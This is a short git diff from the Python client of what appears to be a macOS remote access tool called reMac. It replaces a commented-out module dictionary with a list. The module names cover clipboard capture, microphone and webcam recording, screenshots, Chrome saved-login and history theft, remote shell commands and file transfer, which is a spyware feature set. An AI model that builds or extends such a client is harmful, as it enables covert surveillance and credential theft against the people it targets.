@@ -21,21 +21,6 @@ class reMac_libclient(reMac_libbase):
 
     isShellCmdRunning = False
 
-    # reMacModules = {
-    #     'hw': [mod_client_hello(), 'helloworld', 'Call HelloWorld module', 'hw'],
-    #     'cb': [mod_client_clipboard(), 'clipboard', 'Call clipboard module', 'cb'],
-    #     'rm': [mod_client_recmic(), 'record microphone', 'Call record microphone module', 'rm'],
-    #     'mh': [mod_client_module_help(), 'Module help', 'Call module help module', 'mh'],
-    #     'in': [mod_client_info(), 'Module info', 'Call info module', 'in'],
-    #     'cl': [mod_client_chrome_login(), 'Module Chrome login', 'Call chrome login module', 'cl'],
-    #     'ch': [mod_client_chrome_history(), 'Module Chrome history', 'Call chrome history module', 'ch'],
-    #     'sc': [mod_client_screenshot(), 'Module Screenshot', 'Call screenshot module', 'sc'],
-    #     'wc': [mod_client_webcam(), 'Module Webcam', 'Call webcam module', 'wc'],
-    #     'sh': [mod_client_shellcmd(), 'Module shell command', 'Call shell command module', 'sh'],
-    #     'dl': [mod_client_download(), 'Module download', 'Call download module', 'dl'],
-    #     'ul': [mod_client_upload(), 'Module upload', 'Call upload module', 'ul'],
-    #     'hp': [mod_client_help(), 'Module help', 'Call help module', 'hp']
-    # }
     reMacModules = [
         mod_client_hello(),
         mod_client_clipboard(),
